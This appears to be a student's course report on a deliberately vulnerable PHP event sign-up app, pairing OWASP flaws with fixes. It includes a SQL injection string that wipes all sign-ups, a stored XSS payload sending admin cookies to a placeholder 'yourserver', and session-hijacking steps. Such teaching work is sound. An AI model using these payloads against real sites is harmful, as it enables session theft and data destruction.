# The Report

This project is done with PHP in a LAMP environment.<br> 
See https://github.com/j0ly/firstproject/blob/master/README.md for installation instructions.

There are many problems with the code, but I will only mention the most relevant problems and the most important fixes (as I see them) for each OWASP vulnerability, without going into details. Had to draw a line somewhere, otherwise I could have ended up spending so much time with this (and the assignment didn’t say how specific we needed to be about the fixes). 

The OWASP vulnerabilities:

## A1

### How to identify 
Sign up some users to the event. Check from the Admin page. Then go to the Cancel page and enter: ```' OR '1'='1```. All the sign-ups are now gone, as you can see from the Admin page!    

### How to fix
The “mysqli_real_escape_string” function can be used in “delete.php” on the $ticket variable, to prevent the SQL-injection (as used in “done.php” on other variables). But a simple input validation (fixed length + lowcase alfanum only) would also fix the problem in this case.
## A2
a) Guessable fixed admin credentials (admin/password), which are stored in the source code (login.php) with no encryption.<br> 
b) The cookie-session-id and the clear text admin credentials are sent over an unencrypted connection. You can see them with OWASP ZAP.

### How to identify (broken session management)
You can get access to the Admin page using the stolen cookie-session-id like this (but before you begin, install the “Advanced Cookie Manager” Firefox add-on):

1. Go to the Admin login-page with Firefox (but don’t log in, - if you are not asked for the credentials then close the browser and try again). 
2. Open “Advanced Cookie Manager” and enter the cookie-session-id you saw with OWASP ZAP into the "Value" box, replacing the existing one (delete first, then paste). Save the change.
3. Re-enter the Admin page (do not only reload), and you’re in without entering credentials!

Note: You can use OWASP ZAP together with another browser, to capture the cookie-session-id, when logging in.

### How to fix
Use SSL for the website (see the link in Readme for details)! 

Besides that, the session could be re-generated and the old one destroyed with some intervals. And the session could be made to timeout sooner.  The “secure” and “path” parameters could be used for the session cookie (+ httponly to defend against A3).<br>
The admin credentials could be stored in the database with the password salted + hashed. The admin should be able to change (at least) the password. 

## A3
There are both Stored and Reflected XSS vulnerabilities. The Stored XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
### How to identify (stored XSS)
Enter this code into the address field on the SignUp page;

```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```

When the admin logs in and takes a look at the sign-ups, his session-id should be written to the logs of “yourserver”.<br> 
But you can also test with code like this, in any of the fields on the SignUp page; 
```<body onload=alert('hello')>```

### How to fix
HTML codes should be escaped using the htmlspecialchars or htmlentities PHP-functions + the input validated as tightly as possible (length, allowed characters, format etc.).

## A6
Credit card numbers are sent without SSL in cleartext with POST, and stored unencrypted in the database. And, the session cookie and the admin credentials can be stolen since SSL is not in use (see A2).

### How to identify
Capture the (imaginary) credit card numbers using OWASP ZAP.

### How to fix: 
Again, use SSL! 

But there are many requirements when handling credit card data, see https://en.wikipedia.org/wiki/Payment_Card_Industry_Data_Security_Standard<br>
Regarding the session cookie and admin credentials, see the A2-fix.

## A7
The database credentials are stored in an easy to guess plaintext config file, inside the web-root, and is lacking access control.
### How to identify
Modify “yourserver” in this link to match your installation; http://yourserver/firstproject/admin/config.ini. Then open this link with your browser, and you should see the credentials.
### How to fix
Deny access to the config.ini file, in one way or another. 

There is actually already a .htaccess in the admin folder that should do that, but Apache does not by default enable the use of .htaccess files. To enable, do this:

  Open /etc/apache2/apache2.conf in an editor, and find these lines;
  ```
  <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
  </Directory>
  ```
  Change “AllowOverride None” to “AllowOverride All”. Run the command “apachectl restart”, and try to open the link again.
